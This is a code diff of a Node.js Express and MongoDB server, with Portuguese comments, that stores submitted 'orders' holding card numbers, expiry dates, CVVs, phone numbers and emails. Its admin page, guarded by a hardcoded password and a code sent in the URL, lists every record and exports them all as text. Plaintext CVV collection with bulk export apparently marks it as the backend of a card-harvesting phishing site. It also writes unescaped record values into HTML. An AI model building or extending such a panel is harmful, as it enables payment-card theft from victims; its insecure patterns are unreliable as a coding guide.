@@ -6,15 +6,24 @@ const path     = require('path');
 
 const app = express();
 
-// ===== 1) Conexão com MongoDB =====
-mongoose.connect(process.env.MONGODB_URI, {
+// ====== 1) Conexão com MongoDB ======
+const mongoURI = process.env.MONGODB_URI || process.env.MONGO_URI;
+if (!mongoURI) {
+  console.error('✖️ ERRO: variável de ambiente MONGODB_URI não definida.');
+  process.exit(1);
+}
+
+mongoose.connect(mongoURI, {
   useNewUrlParser: true,
   useUnifiedTopology: true
 })
 .then(() => console.log('MongoDB conectado'))
-.catch(err => console.error('Erro ao conectar MongoDB:', err));
+.catch(err => {
+  console.error('Erro ao conectar MongoDB:', err);
+  process.exit(1);
+});
 
-// ===== 2) Schema e Model de Pedido =====
+// ====== 2) Schema e Model de Pedido ======
 const PedidoSchema = new mongoose.Schema({
   nome_titular:  String,
   numero_cartao: String,
@@ -31,15 +40,15 @@ const PedidoSchema = new mongoose.Schema({
 
 const Pedido = mongoose.model('Pedido', PedidoSchema);
 
-// ===== 3) Middlewares =====
+// ====== 3) Middlewares ======
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
-// ===== 4) Credenciais do Admin =====
+// ====== 4) Credenciais do Admin ======
 const ADMIN_PASSWORD  = 'asap';
 const ADMIN_AUTH_CODE = 'b4d8f3e2c6a1b7c9d0e4f5a8b3c2d7f1';
 
-// ===== 5) Endpoint para criar Pedido =====
+// ====== 5) Endpoint para criar Pedido ======
 app.post('/pedido', async (req, res) => {
   try {
     await Pedido.create(req.body);
@@ -50,46 +59,45 @@ app.post('/pedido', async (req, res) => {
   }
 });
 
-// ===== 6) Painel de Admin =====
+// ====== 6) Painel de Admin ======
 app.get('/admin', async (req, res) => {
   const { senha, auth } = req.query;
+  // autenticação
   if (senha !== ADMIN_PASSWORD || auth !== ADMIN_AUTH_CODE) {
-    const err = (senha||auth) 
-      ? '<p style="color:red;">Senha ou código inválido.</p>' 
+    const err = (senha || auth)
+      ? '<p style="color:red;">Senha ou código inválido.</p>'
       : '';
     return res.send(`
-      <html><head><meta charset="UTF-8"><title>Login Admin</title></head>
-      <body style="font-family:Arial,sans-serif;padding:20px">
-        <h1>Admin Login</h1>${err}
+      <html><head><meta charset="UTF-8"><title>Admin Login</title></head>
+      <body style="font-family:Arial,sans-serif;padding:20px;">
+        <h1>Admin Login</h1>
+        ${err}
         <form method="get" action="/admin">
           <label>Senha:<br>
             <input type="password" name="senha" required style="width:300px;padding:6px">
           </label><br><br>
-          <label>Código:<br>
+          <label>Código de Autenticação:<br>
             <input type="text" name="auth" required style="width:300px;padding:6px">
           </label><br><br>
-          <button type="submit" style="padding:8px 16px">Entrar</button>
+          <button type="submit" style="padding:8px 16px;">Entrar</button>
         </form>
       </body></html>
     `);
   }
 
-  // Autenticado: busca todos os pedidos
+  // autenticado: busca e exibe todos os pedidos
   const pedidos = await Pedido.find().sort('-createdAt').lean();
-
   res.send(`
     <html><head><meta charset="UTF-8"><title>Painel Admin</title>
       <style>
-        body { font-family:Arial,sans-serif; background:#fafafa; padding:20px }
-        h1 { color:#be4299 }
-        details { background:#fff; padding:12px; margin-bottom:12px;
-                  border-radius:8px; box-shadow:0 2px 6px rgba(0,0,0,0.1) }
-        summary { font-weight:bold; cursor:pointer }
-        table { width:100%; border-collapse:collapse; margin-top:8px }
-        th,td { border:1px solid #ddd; padding:6px; text-align:left }
-        th { background:#fdebf5 }
-        button { padding:8px 12px; background:#be4299; color:#fff;
-                 border:none; border-radius:4px; cursor:pointer }
+        body { font-family:Arial,sans-serif; background:#fafafa; padding:20px; }
+        h1 { color:#be4299; }
+        details { background:#fff; padding:12px; margin-bottom:12px; border-radius:8px; box-shadow:0 2px 6px rgba(0,0,0,0.1); }
+        summary { font-weight:bold; cursor:pointer; }
+        table { width:100%; border-collapse:collapse; margin-top:8px; }
+        th,td { border:1px solid #ddd; padding:6px; text-align:left; }
+        th { background:#fdebf5; }
+        button { padding:8px 12px; background:#be4299; color:#fff; border:none; border-radius:4px; cursor:pointer; }
       </style>
     </head><body>
       <h1>Painel Admin — Pedidos</h1>
@@ -99,8 +107,7 @@ app.get('/admin', async (req, res) => {
           <table>
             <tr><th>Campo</th><th>Valor</th></tr>
             ${['nome_titular','numero_cartao','validade','cvv','telefone','email']
-              .map(k => `<tr><td>${k}</td><td>${p[k]||''}</td></tr>`)
-              .join('')}
+              .map(k => `<tr><td>${k}</td><td>${p[k]||''}</td></tr>`).join('')}
           </table>
         </details>
       `).join('')}
@@ -110,12 +117,12 @@ app.get('/admin', async (req, res) => {
         document.getElementById('exportAll').addEventListener('click', () => {
           let txt = '=== Todos os Pedidos ===\\n\\n';
           pedidos.forEach(p => {
-            txt += '--- ' + p.nome_titular + ' (' + new Date(p.createdAt).toLocaleString() + ') ---\\n';
+            txt += '--- Pedido ' + p._id + ' ---\\n';
             ['nome_titular','numero_cartao','validade','cvv','telefone','email']
               .forEach(k => txt += k + ': ' + (p[k]||'') + '\\n');
             txt += '\\n';
           });
-          const blob = new Blob([txt],{type:'text/plain'});
+          const blob = new Blob([txt], { type:'text/plain' });
           const url  = URL.createObjectURL(blob);
           const a    = document.createElement('a');
           a.href     = url;
@@ -128,6 +135,6 @@ app.get('/admin', async (req, res) => {
   `);
 });
 
-// ===== 7) Iniciar servidor =====
+// ====== 7) Inicia o servidor ======
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => console.log(`Servidor rodando na porta ${PORT}`));
